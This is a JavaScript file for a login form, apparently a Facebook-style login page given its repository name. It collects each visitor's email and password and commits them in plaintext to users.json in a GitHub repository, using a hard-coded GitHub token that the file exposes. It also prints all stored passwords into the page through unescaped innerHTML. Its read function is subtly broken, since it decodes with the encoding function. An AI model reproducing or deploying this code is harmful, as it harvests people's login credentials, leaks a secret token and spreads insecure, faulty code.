// 🔥 GitHub Token
const GITHUB_TOKEN = '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';
const REPO_OWNER = 'ASADALSNA';
const REPO_NAME = 'facebook-login';

// دالة لحل مشكلة Unicode مع btoa
function utf8ToBase64(str) {
    const bytes = new TextEncoder().encode(str);
    let binary = '';
    bytes.forEach(byte => binary += String.fromCodePoint(byte));
    return btoa(binary);
}

function base64ToUtf8(base64) {
    const binary = atob(base64);
    const bytes = new Uint8Array(binary.length);
    for (let i = 0; i < binary.length; i++) {
        bytes[i] = binary.charCodeAt(i);
    }
    return new TextDecoder().decode(bytes);
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const message = document.getElementById('message');
    
    if (!email || !password) {
        message.innerHTML = '❌ أدخل إيميل وباسورد!';
        message.className = 'error';
        return;
    }
    
    message.innerHTML = '⏳ جاري الحفظ في GitHub...';
    
    try {
        // قراءة المستخدمين الحاليين
        let currentUsers = await fetchUsers();
        
        // إضافة المستخدم الجديد
        const newUser = {
            id: Date.now(),
            email: email,
            password: password,
            date: new Date().toLocaleString('ar')  // عربي OK دلوقتي!
        };
        currentUsers.push(newUser);
        
        // حفظ
        await saveUsers(currentUsers);
        
        message.innerHTML = `✅ تم الحفظ في GitHub! (${currentUsers.length} مستخدم)`;
        message.className = 'success';
        
        // عرض
        showUsers();
        document.getElementById('loginForm').reset();
        
    } catch (error) {
        console.error('خطأ كامل:', error);
        message.innerHTML = `❌ خطأ: ${error.message}`;
        message.className = 'error';
    }
});

async function fetchUsers() {
    try {
        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
        const response = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        if (response.status === 404) {
            return [];
        }
        
        if (!response.ok) {
            throw new Error(`API Error: ${response.status}`);
        }
        
        const file = await response.json();
        if (!file.content) {
            return [];
        }
        
        const decoded = utf8ToBase64(file.content);  // استخدم الدالة الجديدة
        return JSON.parse(decoded);
    } catch (error) {
        console.error('خطأ في القراءة:', error);
        return [];
    }
}

async function saveUsers(users) {
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`;
    
    let sha = null;
    try {
        const response = await fetch(url, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        if (response.ok) {
            const file = await response.json();
            sha = file.sha;
        }
    } catch (e) {
        // الملف مش موجود
    }
    
    const jsonStr = JSON.stringify(users, null, 2);
    const content = utf8ToBase64(jsonStr);  // استخدم الدالة الجديدة للترميز
    
    const response = await fetch(url, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message: `Add user: ${users[users.length - 1].email}`,
            content: content,
            sha: sha,
            branch: 'main'
        })
    });
    
    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`فشل الحفظ: ${response.status} - ${errorData.message}`);
    }
}

async function showUsers() {
    const users = await fetchUsers();
    const message = document.getElementById('message');
    let display = '<br><h3>👥 المستخدمين من GitHub:</h3>';
    if (users.length === 0) {
        display += '<p>لا يوجد مستخدمين بعد</p>';
    } else {
        users.forEach(user => {
            display += `<p>📧 ${user.email} | 🔐 ${user.password} | 📅 ${user.date}</p>`;
        });
    }
    message.innerHTML += display;
}

// تحميل عند البداية
showUsers();

